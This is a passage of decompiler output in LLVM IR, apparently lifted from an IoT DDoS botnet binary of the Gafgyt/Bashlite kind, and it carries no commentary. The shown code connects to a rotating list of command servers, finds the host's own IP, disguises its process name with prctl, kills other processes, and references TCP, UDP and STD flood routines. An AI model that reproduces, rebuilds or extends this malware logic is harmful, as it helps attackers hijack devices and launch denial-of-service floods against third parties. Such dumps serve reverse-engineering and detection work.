  %v2_11834 = load i32, i32* %v1_11810, align 4
  store i32 %v2_11834, i32* @r4, align 4
  %v0_11838 = call i32 @__GI_getpid()
  store i32 %v0_11838, i32* @r0, align 4
  %v0_11840 = load i32, i32* @r4, align 4
  %v9_11840 = icmp eq i32 %v0_11840, %v0_11838
  br i1 %v9_11840, label %dec_label_pc_1187c, label %dec_label_pc_11848

dec_label_pc_11848:                               ; preds = %dec_label_pc_1181c
  %v2_11858 = load i32, i32* @global_var_30798.71, align 4
  %v2_1185c = add i32 %v2_11858, %v3_117fc
  %v1_11860 = inttoptr i32 %v2_1185c to i32*
  %v2_11860 = load i32, i32* %v1_11860, align 4
  %v2_1186c = call i32 @kill(i32 %v2_11860, i32 9)
  store i32 %v2_1186c, i32* @r0, align 4
  %v1_11874 = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_1187c

dec_label_pc_1187c:                               ; preds = %dec_label_pc_1181c, %dec_label_pc_117f8, %dec_label_pc_11848
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.1, %dec_label_pc_117f8 ], [ %stack_var_-48.1, %dec_label_pc_1181c ], [ %v1_11874, %dec_label_pc_11848 ]
  %v1_11880 = add i32 %storemerge11, 1
  br label %dec_label_pc_11888

dec_label_pc_11888:                               ; preds = %dec_label_pc_11760, %dec_label_pc_1187c
  %stack_var_-48.1 = phi i32 [ 0, %dec_label_pc_11760 ], [ %stack_var_-48.0, %dec_label_pc_1187c ]
  %storemerge11 = phi i32 [ 0, %dec_label_pc_11760 ], [ %v1_11880, %dec_label_pc_1187c ]
  %v5_118a0 = load i32, i32* @global_var_2a53c.69, align 4
  %v9_118b4 = icmp eq i32 %v5_118a0, 0
  br i1 %v9_118b4, label %dec_label_pc_118bc, label %dec_label_pc_117f8

dec_label_pc_118bc:                               ; preds = %dec_label_pc_11888
  %v2_118a0 = load i32, i32* @global_var_2a538.68, align 4
  store i32 0, i32* @r2, align 4
  %tmp99 = icmp ugt i32 %v2_118a0, %storemerge11
  br i1 %tmp99, label %dec_label_pc_117f8, label %dec_label_pc_118dc

dec_label_pc_118dc:                               ; preds = %dec_label_pc_118bc
  %tmp98 = icmp slt i32 %stack_var_-48.1, 1
  %v2_11908 = load i32, i32* @global_var_2a530.50, align 4
  br i1 %tmp98, label %dec_label_pc_11904, label %dec_label_pc_118e8

dec_label_pc_118e8:                               ; preds = %dec_label_pc_118dc
  store i32 %stack_var_-48.1, i32* @r2, align 4
  %v3_118fc = call i32 @sockprintf(i32 %v2_11908, i32 ptrtoint ([11 x i8]* @global_var_202c0.774 to i32))
  br label %dec_label_pc_11918

dec_label_pc_11904:                               ; preds = %dec_label_pc_118dc
  %v3_11914 = call i32 @sockprintf(i32 %v2_11908, i32 ptrtoint ([13 x i8]* @global_var_202cc.776 to i32))
  br label %dec_label_pc_11918

dec_label_pc_11918:                               ; preds = %dec_label_pc_11740, %dec_label_pc_118e8, %dec_label_pc_11904
  %v2_1191c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_202dc.778 to i32), i32* @r1, align 4
  %v3_11928 = inttoptr i32 %v2_1191c to i8*
  %v4_11928 = call i32 @__GI_strcoll(i8* %v3_11928, i32 ptrtoint ([10 x i8]* @global_var_202dc.778 to i32))
  %v2_11930 = icmp eq i32 %v4_11928, 0
  br i1 %v2_11930, label %dec_label_pc_11938, label %dec_label_pc_11940

dec_label_pc_11938:                               ; preds = %dec_label_pc_11918
  %v1_1193c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11940

dec_label_pc_11940:                               ; preds = %dec_label_pc_10dd0, %dec_label_pc_10d68, %dec_label_pc_11368, %dec_label_pc_1126c, %dec_label_pc_115a0, %dec_label_pc_11718, %dec_label_pc_11918, %dec_label_pc_1138c, %dec_label_pc_10df4, %dec_label_pc_10980, %dec_label_pc_11348, %dec_label_pc_1133c, %dec_label_pc_11144, %dec_label_pc_10918, %dec_label_pc_11634, %dec_label_pc_114ac, %dec_label_pc_10f44, %dec_label_pc_10c00, %dec_label_pc_10a94, %dec_label_pc_109b8, %dec_label_pc_108b0, %dec_label_pc_10878, %dec_label_pc_11938
  %v1_11948 = phi i32 [ %v1_11378, %dec_label_pc_11368 ], [ %v0_1126c, %dec_label_pc_1126c ], [ %v0_115a0, %dec_label_pc_115a0 ], [ %v0_11718, %dec_label_pc_11718 ], [ %v4_11928, %dec_label_pc_11918 ], [ %v0_1138c, %dec_label_pc_1138c ], [ %v0_10df4, %dec_label_pc_10df4 ], [ 0, %dec_label_pc_10980 ], [ %v1_11358, %dec_label_pc_11348 ], [ 0, %dec_label_pc_1133c ], [ 0, %dec_label_pc_11144 ], [ 0, %dec_label_pc_10918 ], [ %v3_11644, %dec_label_pc_11634 ], [ %v3_114bc, %dec_label_pc_114ac ], [ %v3_10f54, %dec_label_pc_10f44 ], [ %v3_10c10, %dec_label_pc_10c00 ], [ %v3_10ab8, %dec_label_pc_10a94 ], [ %v0_10990, %dec_label_pc_109b8 ], [ %v3_108cc, %dec_label_pc_108b0 ], [ %v3_10888, %dec_label_pc_10878 ], [ %v1_1193c, %dec_label_pc_11938 ], [ 0, %dec_label_pc_10d68 ], [ 0, %dec_label_pc_10dd0 ]
  store i32 %v3_10844, i32* @r4, align 4
  store i32 %v6_10844, i32* @r5, align 4
  store i32 %v9_10844, i32* @r6, align 4
  store i32 %v12_10844, i32* @r7, align 4
  store i32 %v15_10844, i32* @r8, align 4
  store i32 %v18_10844, i32* @fp, align 4
  ret i32 %v1_11948

; uselistorder directives
  uselistorder i32 %v2_11908, { 1, 0 }
  uselistorder i32 %stack_var_-48.1, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_117fc, { 1, 0 }
  uselistorder i32 %v2_116fc, { 2, 1, 0 }
  uselistorder i32 %v1_11688, { 1, 0 }
  uselistorder i32 %v1_1166c, { 1, 0 }
  uselistorder i32 %v2_11654, { 1, 0, 3, 2 }
  uselistorder i32 %v2_11584, { 2, 1, 0 }
  uselistorder i32 %v1_11500, { 1, 0 }
  uselistorder i32 %v1_114e4, { 1, 0 }
  uselistorder i32 %v2_114cc, { 1, 0, 3, 2 }
  uselistorder i32 %v2_11250, { 1, 0 }
  uselistorder i32* %v1_11158, { 2, 0, 1, 3 }
  uselistorder i32 %v2_110c4, { 2, 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v1_10fb4, { 1, 0 }
  uselistorder i32 %v1_10f98, { 1, 0 }
  uselistorder i32 %v1_10f7c, { 1, 0 }
  uselistorder i32 %v2_10f64, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10dd8, { 2, 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %storemerge10, { 1, 0 }
  uselistorder i32 %v1_10c70, { 1, 0 }
  uselistorder i32 %v1_10c54, { 1, 0 }
  uselistorder i32 %v1_10c38, { 1, 0 }
  uselistorder i32 %v2_10c20, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 5, 6, 7, 8, 9, 27, 4, 28, 29, 30, 31, 3, 32, 33, 34, 2, 1, 0, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1fd3c.572 to i32), { 3, 12, 4, 13, 2, 14, 5, 15, 1, 16, 6, 17, 0, 18, 7, 19, 8, 20, 9, 21, 10, 22, 11, 23 }
  uselistorder i32* @global_var_30794.732, { 0, 2, 1, 3 }
  uselistorder i32 ()* @getdtablesize, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1ee88.52 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_11940, { 22, 6, 5, 14, 4, 15, 7, 2, 10, 11, 3, 12, 16, 8, 0, 1, 17, 18, 19, 9, 13, 20, 21 }
  uselistorder label %dec_label_pc_11918, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11888, { 1, 0 }
  uselistorder label %dec_label_pc_1187c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_117f8, { 1, 0 }
  uselistorder label %dec_label_pc_11740, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_116f4, { 1, 0 }
  uselistorder label %dec_label_pc_116cc, { 1, 0 }
  uselistorder label %dec_label_pc_115c8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1157c, { 1, 0 }
  uselistorder label %dec_label_pc_11544, { 1, 0 }
  uselistorder label %dec_label_pc_11440, { 1, 0 }
  uselistorder label %dec_label_pc_1131c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11248, { 1, 0 }
  uselistorder label %dec_label_pc_11198, { 1, 0 }
  uselistorder label %dec_label_pc_11124, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_110bc, { 1, 0 }
  uselistorder label %dec_label_pc_11078, { 1, 0 }
  uselistorder label %dec_label_pc_11038, { 1, 0 }
  uselistorder label %dec_label_pc_11000, { 1, 0 }
  uselistorder label %dec_label_pc_10f5c, { 1, 0 }
  uselistorder label %dec_label_pc_10e40, { 1, 0 }
  uselistorder label %dec_label_pc_10dd0, { 1, 0 }
  uselistorder label %dec_label_pc_10d84, { 1, 0 }
  uselistorder label %dec_label_pc_10d44, { 1, 0 }
  uselistorder label %dec_label_pc_10d0c, { 1, 0 }
  uselistorder label %dec_label_pc_10cc8, { 1, 0 }
  uselistorder label %dec_label_pc_10c18, { 1, 0 }
  uselistorder label %dec_label_pc_10a74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10a10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1095c, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_11950 = load i32, i32* @fp, align 4
  store i32 72024, i32* %stack_var_-4, align 4
  %v2_11954 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11954, i32* @fp, align 4
  %v2_11968 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_11978 = bitcast i32* %stack_var_-4116 to i8*
  %v3_11978 = call i32 @__GI_memset(i8* %v2_11978, i32 0)
  %v2_11980 = load i32, i32* @global_var_2a530.50, align 4
  %v2_11984 = icmp eq i32 %v2_11980, 0
  br i1 %v2_11984, label %dec_label_pc_119a8, label %dec_label_pc_1198c

dec_label_pc_1198c:                               ; preds = %entry
  %v1_11998 = call i32 @__GI_close(i32 %v2_11980)
  store i32 0, i32* @global_var_2a530.50, align 4
  br label %dec_label_pc_119a8

dec_label_pc_119a8:                               ; preds = %entry, %dec_label_pc_1198c
  %v2_119ac = load i32, i32* @global_var_2a1ec.781, align 4
  %v2_119b0 = icmp eq i32 %v2_119ac, 0
  br i1 %v2_119b0, label %dec_label_pc_119dc, label %dec_label_pc_119c8

dec_label_pc_119c8:                               ; preds = %dec_label_pc_119a8
  %v1_119d0 = add i32 %v2_119ac, 1
  br label %dec_label_pc_119dc

dec_label_pc_119dc:                               ; preds = %dec_label_pc_119a8, %dec_label_pc_119c8
  %storemerge1 = phi i32 [ %v1_119d0, %dec_label_pc_119c8 ], [ 0, %dec_label_pc_119a8 ]
  store i32 %storemerge1, i32* @global_var_2a1ec.781, align 4
  %v4_119f4 = mul i32 %storemerge1, 4
  %v5_119f4 = add i32 %v4_119f4, ptrtoint ([16 x i8]** @global_var_2a1e8.783 to i32)
  %v6_119f4 = inttoptr i32 %v5_119f4 to i32*
  %v7_119f4 = load i32, i32* %v6_119f4, align 4
  store i32 %v7_119f4, i32* @r1, align 4
  %v3_11a00 = call i32 @strcpy(i8* %v2_11978, i32 %v7_119f4)
  store i32 %v2_11968, i32* @r0, align 4
  %v2_11a20 = call i32 @__GI_strchr(i32 %v2_11968, i32 58)
  %v2_11a28 = icmp eq i32 %v2_11a20, 0
  br i1 %v2_11a28, label %dec_label_pc_11a88, label %dec_label_pc_11a30

dec_label_pc_11a30:                               ; preds = %dec_label_pc_119dc
  store i32 %v2_11968, i32* @r0, align 4
  %v2_11a44 = call i32 @__GI_strchr(i32 %v2_11968, i32 58)
  %v1_11a4c = add i32 %v2_11a44, 1
  store i32 %v1_11a4c, i32* @r0, align 4
  %v1_11a54 = call i32 @atol(i32 %v1_11a4c)
  store i32 %v2_11968, i32* @r0, align 4
  %v2_11a74 = call i32 @__GI_strchr(i32 %v2_11968, i32 58)
  %v3_11a84 = inttoptr i32 %v2_11a74 to i8*
  store i8 0, i8* %v3_11a84, align 1
  br label %dec_label_pc_11a88

dec_label_pc_11a88:                               ; preds = %dec_label_pc_119dc, %dec_label_pc_11a30
  %stack_var_-20.0 = phi i32 [ 23, %dec_label_pc_119dc ], [ %v1_11a54, %dec_label_pc_11a30 ]
  %v3_11a94 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_11a94, i32* @global_var_2a530.50, align 4
  %v4_11ac8 = call i32 @connectTimeout(i32 %v3_11a94, i32 %v2_11968, i32 %stack_var_-20.0, i32 30)
  %v2_11ad0 = icmp eq i32 %v4_11ac8, 0
  %. = zext i1 %v2_11ad0 to i32
  store i32 %v3_11950, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_11968, { 4, 1, 0, 3, 2, 6, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_11a88, { 1, 0 }
  uselistorder label %dec_label_pc_119dc, { 1, 0 }
  uselistorder label %dec_label_pc_119a8, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11b1c = load i32, i32* @fp, align 4
  store i32 %v3_11b1c, i32* %stack_var_-16, align 4
  %v3_11b38 = call i32 @socket(i32 2, i32 2, i32 0)
  %v3_11b48 = icmp eq i32 %v3_11b38, -1
  br i1 %v3_11b48, label %dec_label_pc_11b50, label %dec_label_pc_11b60

dec_label_pc_11b50:                               ; preds = %entry
  br label %dec_label_pc_11d9c

dec_label_pc_11b60:                               ; preds = %entry
  %v2_11b60 = ptrtoint i32* %stack_var_-52 to i32
  store i32 16, i32* @r2, align 4
  %v2_11b70 = bitcast i32* %stack_var_-52 to i8*
  %v3_11b70 = call i32 @__GI_memset(i8* %v2_11b70, i32 0)
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_202e8.785 to i32), i32* @r0, align 4
  %v2_11b80 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_202e8.785 to i32))
  %v1_11b90 = call i32 @__GI_htons(i32 53)
  %v3_11bac = call i32 @__libc_connect(i32 %v3_11b38, i32 %v2_11b60, i32 16)
  %v3_11bbc = icmp eq i32 %v3_11bac, -1
  br i1 %v3_11bbc, label %dec_label_pc_11bc4, label %dec_label_pc_11bd4

dec_label_pc_11bc4:                               ; preds = %dec_label_pc_11b60
  br label %dec_label_pc_11d9c

dec_label_pc_11bd4:                               ; preds = %dec_label_pc_11b60
  store i32 16, i32* %stack_var_-72, align 4
  %v2_11bdc = ptrtoint i32* %stack_var_-68 to i32
  %v2_11be0 = ptrtoint i32* %stack_var_-72 to i32
  %v5_11bec = call i32 @__GI_getsockname(i32 %v3_11b38, i32 %v2_11bdc, i32 %v2_11be0, i32 %v2_11bdc, i32 16)
  %v3_11bfc = icmp eq i32 %v5_11bec, -1
  br i1 %v3_11bfc, label %dec_label_pc_11c04, label %dec_label_pc_11c14

dec_label_pc_11c04:                               ; preds = %dec_label_pc_11bd4
  br label %dec_label_pc_11d9c

dec_label_pc_11c14:                               ; preds = %dec_label_pc_11bd4
  store i32 %tmp19, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_3078c.483 to i32), i32* @r2, align 4
  store i32 %tmp19, i32* @global_var_3078c.483, align 4
  %v3_11c28 = call i32 @__GI_open(i32 ptrtoint ([16 x i8]* @global_var_202f0.788 to i32), i32 0)
  %v2_11cc0 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_11cb8

dec_label_pc_11c38:                               ; preds = %dec_label_pc_11cb8
  %v4_11c4c = call i32 @strstr(i32 %v2_11cc0, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_20300.790, i32 0, i32 0))
  %v2_11c54 = icmp eq i32 %v4_11c4c, 0
  br i1 %v2_11c54, label %dec_label_pc_11c9c, label %dec_label_pc_11c7c.preheader

dec_label_pc_11c7c.preheader:                     ; preds = %dec_label_pc_11c38
  %v2_11c809 = load i8, i8* %stack_var_-4168, align 1
  %v7_11c8413 = icmp eq i8 %v2_11c809, 9
  br i1 %v7_11c8413, label %dec_label_pc_11c8c, label %dec_label_pc_11c70

dec_label_pc_11c70:                               ; preds = %dec_label_pc_11c7c.preheader, %dec_label_pc_11c70
  %v4_11c7c14 = phi i32 [ %v1_11c74, %dec_label_pc_11c70 ], [ %v2_11cc0, %dec_label_pc_11c7c.preheader ]
  %v1_11c74 = add i32 %v4_11c7c14, 1
  %v5_11c78 = inttoptr i32 %v1_11c74 to i8*
  %v2_11c80 = load i8, i8* %v5_11c78, align 1
  %v7_11c84 = icmp eq i8 %v2_11c80, 9
  br i1 %v7_11c84, label %dec_label_pc_11c8c, label %dec_label_pc_11c70

dec_label_pc_11c8c:                               ; preds = %dec_label_pc_11c70, %dec_label_pc_11c7c.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_11c7c.preheader ], [ %v5_11c78, %dec_label_pc_11c70 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_11ce0

dec_label_pc_11c9c:                               ; preds = %dec_label_pc_11c38
  store i32 4096, i32* @r2, align 4
  %v3_11cb4 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_11cb8

dec_label_pc_11cb8:                               ; preds = %dec_label_pc_11c14, %dec_label_pc_11c9c
  %v4_11cd0 = call i32 @fdgets(i32 %v2_11cc0, i32 4096, i32 %v3_11c28, i32 %v2_11cc0)
  %v2_11cd8 = icmp eq i32 %v4_11cd0, 0
  br i1 %v2_11cd8, label %dec_label_pc_11ce0, label %dec_label_pc_11c38

dec_label_pc_11ce0:                               ; preds = %dec_label_pc_11cb8, %dec_label_pc_11c8c
  %v1_11ce4 = call i32 @__GI_close(i32 %v3_11c28)
  %v4_11cf4 = load i8, i8* %stack_var_-4168, align 1
  %v2_11cf8 = icmp eq i8 %v4_11cf4, 0
  br i1 %v2_11cf8, label %dec_label_pc_11d90, label %dec_label_pc_11d00

dec_label_pc_11d00:                               ; preds = %dec_label_pc_11ce0
  %v2_11d08 = ptrtoint i32* %stack_var_-4200 to i32
  store i32 %v2_11cc0, i32* @r1, align 4
  %v2_11d20 = bitcast i32* %stack_var_-4200 to i8*
  %v3_11d20 = call i32 @strcpy(i8* %v2_11d20, i32 %v2_11cc0)
  store i32 %v2_11d08, i32* @r3, align 4
  %v3_11d40 = call i32 @ioctl(i32 %v3_11b38, i32 35111, i32 %v2_11d08)
  %v2_11d60 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_11d50

dec_label_pc_11d50:                               ; preds = %dec_label_pc_11d00, %dec_label_pc_11d50
  %storemerge47 = phi i32 [ 0, %dec_label_pc_11d00 ], [ %v1_11d7c, %dec_label_pc_11d50 ]
  store i32 %storemerge47, i32* @r1, align 4
  %v2_11d68 = add i32 %storemerge47, %v2_11d60
  %v1_11d6c = inttoptr i32 %v2_11d68 to i8*
  %v2_11d6c = load i8, i8* %v1_11d6c, align 1
  %v4_11d74 = add i32 %storemerge47, ptrtoint (i32* @global_var_2a540.792 to i32)
  %v5_11d74 = inttoptr i32 %v4_11d74 to i8*
  store i8 %v2_11d6c, i8* %v5_11d74, align 1
  %v1_11d7c = add nuw nsw i32 %storemerge47, 1
  %v7_11d8c = icmp slt i32 %v1_11d7c, 6
  br i1 %v7_11d8c, label %dec_label_pc_11d50, label %dec_label_pc_11d90

dec_label_pc_11d90:                               ; preds = %dec_label_pc_11d50, %dec_label_pc_11ce0
  %v1_11d94 = call i32 @__GI_close(i32 %v3_11b38)
  %v3_11db0.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_11dac

dec_label_pc_11d9c:                               ; preds = %dec_label_pc_11c04, %dec_label_pc_11bc4, %dec_label_pc_11b50
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_11dac

dec_label_pc_11dac:                               ; preds = %dec_label_pc_11d90, %dec_label_pc_11d9c
  %v3_11db0 = phi i32 [ %v3_11db0.pre, %dec_label_pc_11d90 ], [ 0, %dec_label_pc_11d9c ]
  %v2_11db8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11db8, i32* @fp, align 4
  ret i32 %v3_11db0

; uselistorder directives
  uselistorder i32 %storemerge47, { 3, 1, 0, 2 }
  uselistorder i32 %v1_11c74, { 1, 0 }
  uselistorder i32 %v2_11cc0, { 2, 1, 3, 5, 0, 4 }
  uselistorder i32 %v3_11b38, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 4, 2, 0, 1, 3 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_htons, { 11, 1, 10, 9, 8, 7, 6, 5, 12, 4, 3, 2, 0 }
  uselistorder i32 53, { 0, 2, 1 }
  uselistorder i32 (i32)* @inet_addr, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_11dac, { 1, 0 }
  uselistorder label %dec_label_pc_11d50, { 1, 0 }
  uselistorder label %dec_label_pc_11cb8, { 1, 0 }
  uselistorder label %dec_label_pc_11c70, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_11dd4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_11dd4, i32* @ip, align 4
  ret i32 ptrtoint ([9 x i8]* @global_var_2030c.794 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11dfc = load i32, i32* @r4, align 4
  store i32 %v3_11dfc, i32* %stack_var_-24, align 4
  store i32 73220, i32* %stack_var_-4, align 4
  %v19_11dfc = ptrtoint i32* %stack_var_-24 to i32
  %v2_11e00 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11e00, i32* @fp, align 4
  %v1_11e44 = bitcast i8** %argv to i32*
  %v2_11e44 = load i32, i32* %v1_11e44, align 4
  store i32 %v2_11e44, i32* @r4, align 4
  %v2_11e5c = load i32, i32* %v1_11e44, align 4
  %v1_11e60 = inttoptr i32 %v2_11e5c to i8*
  %v3_11e64 = call i32 @strlen(i8* %v1_11e60)
  %v0_11e6c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_20318.796 to i32), i32* @r1, align 4
  %v3_11e78 = call i32 @strncpy(i32 %v0_11e6c, i32 ptrtoint (i32* @global_var_20318.796 to i32), i32 %v3_11e64)
  store i32 ptrtoint (i32* @global_var_20318.796 to i32), i32* %v1_11e44, align 4
  %v5_11eb4 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_20318.796 to i32), i32 0, i32 0, i32 0)
  %v2_11ebc = call i32 @__GI_time(i32* null)
  store i32 %v2_11ebc, i32* @r0, align 4
  store i32 %v2_11ebc, i32* @r4, align 4
  %v0_11ec4 = call i32 @__GI_getpid()
  %v0_11ecc = load i32, i32* @r4, align 4
  %v2_11ecc = xor i32 %v0_11ecc, %v0_11ec4
  %v1_11ed4 = call i32 @srand(i32 %v2_11ecc)
  %v2_11edc = call i32 @__GI_time(i32* null)
  store i32 %v2_11edc, i32* @r0, align 4
  store i32 %v2_11edc, i32* @r4, align 4
  %v0_11ee4 = call i32 @__GI_getpid()
  %v0_11eec = load i32, i32* @r4, align 4
  %v2_11eec = xor i32 %v0_11eec, %v0_11ee4
  %v1_11ef4 = call i32 @init_rand(i32 %v2_11eec)
  store i32 ptrtoint ([19 x i8]* @global_var_2031c.798 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_20330.800 to i32), i32* @r1, align 4
  %v3_11f10 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_2031c.798 to i32), i32 ptrtoint ([2 x i8]* @global_var_20330.800 to i32))
  %v2_11f20 = icmp eq i32 %v3_11f10, 0
  br i1 %v2_11f20, label %dec_label_pc_11f28, label %dec_label_pc_11f44

dec_label_pc_11f28:                               ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_20334.802 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_20330.800 to i32), i32* @r1, align 4
  %v3_11f38 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_20334.802 to i32), i32 ptrtoint ([2 x i8]* @global_var_20330.800 to i32))
  br label %dec_label_pc_11f44

dec_label_pc_11f44:                               ; preds = %entry, %dec_label_pc_11f28
  %stack_var_-88.0 = phi i32 [ %v3_11f38, %dec_label_pc_11f28 ], [ %v3_11f10, %entry ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_20334.802, i32 0, i32 0), %dec_label_pc_11f28 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_2031c.798, i32 0, i32 0), %entry ]
  %v2_11f48 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v2_11f48, label %dec_label_pc_120e0, label %dec_label_pc_11f50

dec_label_pc_11f50:                               ; preds = %dec_label_pc_11f44
  %v2_11f60 = load i32, i32* %v1_11e44, align 4
  %v1_11f64 = inttoptr i32 %v2_11f60 to i8*
  %v3_11f68 = call i32 @strlen(i8* %v1_11f64)
  %v2_11f7c = ptrtoint i32* %stack_var_-368 to i32
  %v2_11f88 = call i32 @getcwd(i32 %v2_11f7c, i32 256)
  store i32 ptrtoint (i32* @global_var_20344.804 to i32), i32* @r1, align 4
  %v2_11f98 = bitcast i32* %stack_var_-368 to i8*
  %v3_11f98 = call i32 @__GI_strcoll(i8* %v2_11f98, i32 ptrtoint (i32* @global_var_20344.804 to i32))
  %v2_11fa0 = icmp eq i32 %v3_11f98, 0
  br i1 %v2_11fa0, label %dec_label_pc_120d8, label %dec_label_pc_11fb8

dec_label_pc_11fac:                               ; preds = %dec_label_pc_11fb8
  %v1_11fb0 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_11fb8

dec_label_pc_11fb8:                               ; preds = %dec_label_pc_11f50, %dec_label_pc_11fac
  %stack_var_-84.0 = phi i32 [ %v1_11fb0, %dec_label_pc_11fac ], [ %v3_11f68, %dec_label_pc_11f50 ]
  %v2_11fc8 = load i32, i32* %v1_11e44, align 4
  %v2_11fd0 = add i32 %v2_11fc8, %stack_var_-84.0
  %v1_11fd4 = inttoptr i32 %v2_11fd0 to i8*
  %v2_11fd4 = load i8, i8* %v1_11fd4, align 1
  %v7_11fd8 = icmp eq i8 %v2_11fd4, 47
  br i1 %v7_11fd8, label %dec_label_pc_11fe0, label %dec_label_pc_11fac

dec_label_pc_11fe0:                               ; preds = %dec_label_pc_11fb8
  %v2_11ff0 = load i32, i32* %v1_11e44, align 4
  %v2_11ff8 = add i32 %v2_11ff0, %stack_var_-84.0
  %v2_11ffc = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_11ffc, i32* @r0, align 4
  %v8_12010 = call i32 @sprintf(i32 %v2_11ffc, i32 ptrtoint ([8 x i8]* @global_var_20348.806 to i32), i32 %v2_11f7c, i32 %v2_11ff8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_1206c = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_12020 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_1204c = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_12068.outer

dec_label_pc_12018:                               ; preds = %dec_label_pc_12068
  %v3_12030 = call i32 @fgets(i32 %v2_12020, i32 1024, i32 %stack_var_-88.0)
  %v3_1204c = call i32 @__GI_strcasecmp(i8* %v2_1204c, i32 %v2_11ffc)
  %v2_12054 = icmp eq i32 %v3_1204c, 0
  br i1 %v2_12054, label %dec_label_pc_1205c, label %dec_label_pc_12068

dec_label_pc_1205c:                               ; preds = %dec_label_pc_12018
